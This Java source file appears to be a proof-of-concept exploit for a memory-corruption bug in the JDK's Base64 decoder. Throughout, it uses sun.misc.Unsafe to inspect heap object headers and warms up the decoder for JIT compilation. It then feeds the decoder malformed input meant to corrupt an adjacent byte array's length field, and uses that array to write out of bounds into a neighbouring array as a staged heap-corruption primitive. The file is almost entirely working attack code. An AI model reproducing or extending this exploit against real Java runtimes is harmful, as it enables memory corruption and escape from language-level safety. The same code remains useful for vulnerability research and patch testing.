import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import sun.misc.Unsafe;

public final class WriteThrough {
    static Unsafe U;
    static volatile byte[] out, writer, reader;
    static volatile Object[] holder;
    static long wMark, rMark;
    static int wKlass, wLen, rKlass, rLen;

    public static void main(String[] a) throws Exception {
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        U = (Unsafe) f.get(null);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad   = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);

        alloc();
        Arrays.fill(reader, (byte) 0x00);

        int o1 = U.getInt(holder, 16L), o2 = U.getInt(holder, 20L), o3 = U.getInt(holder, 24L);
        System.out.printf("out@%08x writer@%08x reader@%08x d1=%d d2=%d%n", o1, o2, o3, o2 - o1, o3 - o2);

        for (int i = 0; i < 200_000; i++) d.decode(valid, out);
        for (int i = 0; i < 200_000; i++) poke(writer, i & 63, (byte) i);

        wMark = U.getLong(writer, 0L); wKlass = U.getInt(writer, 8L); wLen = U.getInt(writer, 12L);
        rMark = U.getLong(reader, 0L); rKlass = U.getInt(reader, 8L); rLen = U.getInt(reader, 12L);

        try { d.decode(bad, out); } catch (IllegalArgumentException ignored) {}
        int wLenAfter = U.getInt(writer, 12L);
        System.out.printf("writer len %d -> %d (unsigned %d)%n", wLen, wLenAfter, wLenAfter & 0xffffffffL);

        try {
            for (int i = 0; i < 8; i++) poke(writer, 64 + i, (byte) (rMark >>> (8 * i)));
            for (int i = 0; i < 4; i++) poke(writer, 72 + i, (byte) (rKlass >>> (8 * i)));
            for (int i = 0; i < 4; i++) poke(writer, 76 + i, (byte) (rLen >>> (8 * i)));
            System.out.println("reader header restored via writer[64..79]");

            for (int i = 0; i < 8; i++) poke(writer, 80 + i, (byte) (0xC0 + i));
        } catch (Throwable t) {
            System.out.println("poke threw: " + t);
        }

        byte[] expect = new byte[8];
        for (int i = 0; i < 8; i++) expect[i] = (byte) (0xC0 + i);
        System.out.println("expect  =" + hex(expect));
        System.out.println("reader  =" + hex(Arrays.copyOf(reader, 8)));
        System.out.println("reader.length=" + reader.length);
        System.out.println(Arrays.equals(Arrays.copyOf(reader, 8), expect) ? "STAGE C OK" : "STAGE C FAIL");

        U.putLong(reader, 0L, rMark); U.putInt(reader, 8L, rKlass); U.putInt(reader, 12L, rLen);
        U.putLong(writer, 0L, wMark); U.putInt(writer, 8L, wKlass); U.putInt(writer, 12L, wLen);
        System.out.println("repaired");
    }

    static void poke(byte[] a, int i, byte v) { a[i] = v; }

    static String hex(byte[] b) {
        StringBuilder sb = new StringBuilder();
        for (byte x : b) sb.append(String.format("%02x", x & 0xff));
        return sb.toString();
    }

    static void alloc() {
        out = new byte[50];
        writer = new byte[64];
        reader = new byte[64];
        holder = new Object[]{out, writer, reader};
    }
}
